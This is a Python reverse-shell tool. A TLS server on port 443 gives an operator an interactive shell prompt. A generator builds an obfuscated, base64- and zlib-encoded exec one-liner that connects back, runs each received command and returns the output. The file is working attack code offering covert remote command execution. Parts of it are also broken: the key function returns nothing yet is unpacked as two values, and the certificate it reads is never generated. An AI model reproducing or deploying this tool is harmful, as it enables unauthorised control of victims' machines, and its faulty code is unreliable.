import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import zlib
from threading import Thread


def keys_check_or_create(ip_address):
    keys_dir = "keys"
    os.makedirs(keys_dir, exist_ok=True)  # Ensure the keys directory exists

    # Remove existing keys and certificates
    for file in os.listdir(keys_dir):
        file_path = os.path.join(keys_dir, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
    print("[*] Existing keys and certificates removed.")

    # Generate RSA key pair
    from Crypto.PublicKey import RSA
    key = RSA.generate(2048)

    # Write the private key
    private_key_path = os.path.join(keys_dir, "private_key.pem")
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    print("[*] Private key generated.")

    # Write the public key
    public_key_path = os.path.join(keys_dir, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    print("[*] Public key generated.")
    
    
def generate_certificate(private_key_path, cert_path, ip_address):
    """
    Generate a self-signed certificate with Subject Alternative Name (SAN).
    Requires OpenSSL to be installed on the system.
    """
    openssl_config = "openssl.cnf"

    # Create OpenSSL configuration file
    with open(openssl_config, "w") as f:
        f.write(f"""
[ req ]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = SanFrancisco
O = MyOrg
OU = IT
CN = {ip_address}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_address}
""")

    try:
        # Generate certificate with OpenSSL
        openssl_command = [
            "openssl", "req", "-new", "-x509",
            "-key", private_key_path,
            "-out", cert_path,
            "-days", "365",
            "-config", openssl_config
        ]
        run(openssl_command, check=True)
        print("[*] OpenSSL: Certificate generated successfully.")
    except CalledProcessError as e:
        print(f"[!] OpenSSL error: {e}")
    finally:
        # Clean up temporary OpenSSL configuration file
        if os.path.exists(openssl_config):
            os.remove(openssl_config)
            
            
def generate_and_compress_client_code(ip, port):
    """
    Generate and compress the client code for execution as a one-liner.
    """
    certfile = os.path.join("keys", "server.crt")
    with open(certfile, "r") as f:
        cert_content = f.read()

    # Client script template
    client_code = f"""
import socket, ssl, subprocess
CERT=\"\"\"{cert_content}\"\"\"
def connect():
    context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    with socket.create_connection(("{ip}", {port})) as sock:
        with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
            while True:
                cmd=ssock.recv(8192).decode()
                if cmd.lower()=="exit":break
                output=subprocess.getoutput(cmd)
                ssock.sendall(output.encode())
connect()
"""

    # Compress and encode the client code
    compressed_code = zlib.compress(client_code.encode())
    encoded_code = base64.b64encode(compressed_code).decode()

    # Return the one-liner
    return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded_code}')))"


def start_server(ip, port=443):
    """
    Start the TLS server for communication.
    """
    certfile, keyfile = keys_check_or_create(ip)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((ip, port))
        server_socket.listen(5)
        print(f"[*] Server listening on {ip}:{port}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            while True:
                client_socket, addr = tls_server.accept()
                print(f"[+] Connection from {addr}")
                Thread(target=handle_client, args=(client_socket,)).start()
                
def handle_client(client_socket):
    buffer_size = 8192
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ["exit", "quit"]:
                client_socket.sendall(b"exit")
                break
            client_socket.sendall(command.encode())
            response = client_socket.recv(buffer_size).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        
if __name__ == "__main__":
    # Prompt the user for the server IP address
    server_ip = input("[Don't use 0.0.0.0 use reachable IP like 192.168.1.11] Enter the IP address to bind the server: ").strip()
    if not server_ip:
        print("[!] IP address is required. Exiting.")
    else:
        start_server(server_ip, 443)